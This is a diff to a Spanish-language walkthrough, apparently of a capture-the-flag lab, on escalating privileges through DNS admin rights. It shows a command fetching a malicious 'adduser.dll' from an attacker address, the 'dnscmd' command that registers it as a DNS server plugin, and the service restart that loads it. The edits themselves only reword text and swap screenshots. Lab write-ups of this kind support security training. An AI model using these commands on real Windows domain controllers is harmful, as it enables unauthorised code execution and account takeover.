@@ -426,12 +426,14 @@ wget "http://10.10.14.27:7777/adduser.dll" -outfile "adduser.dll"
 
 <img width="761" height="396" alt="image" src="https://github.com/user-attachments/assets/48040e95-1b95-4ead-b338-11c5d9b7f219" />
 
-Cargamos la dll con el siguiente comando:
+Cargamos la dll con el siguiente comando en el registro:
 
 ```powershell
 dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\adduser.dll
 ```
-xxxxxxx
+
+<img width="651" height="183" alt="image" src="https://github.com/user-attachments/assets/390725a0-4d34-4476-a256-9c9083b71874" />
+
 
 Para que estos cambios tengan efecto, el servicio dns debe reiniciarse. Procedemos a verificar si tenemos los permisos para reiniciar el servicio.
 
@@ -469,9 +471,8 @@ y
 ```cmd
 sc.exe start dns
 ```
+<img width="634" height="400" alt="image" src="https://github.com/user-attachments/assets/d3f00377-c42e-4e8b-a4e4-025cad111d1c" />
 
-
-<img width="654" height="338" alt="image" src="https://github.com/user-attachments/assets/54d2d34f-d103-4b5c-9771-a5eed7cbf13e" />
 
 A veces al correr `sc start` se aplica un contexto de ejecución diferente y el reinicio no llega a recargar completamente los componentes del servicio, especialmente las dll de pluguin. Con sc,exe el servicio se reinicia completamente y windows vuelve a cargar todas las dependencias.
 
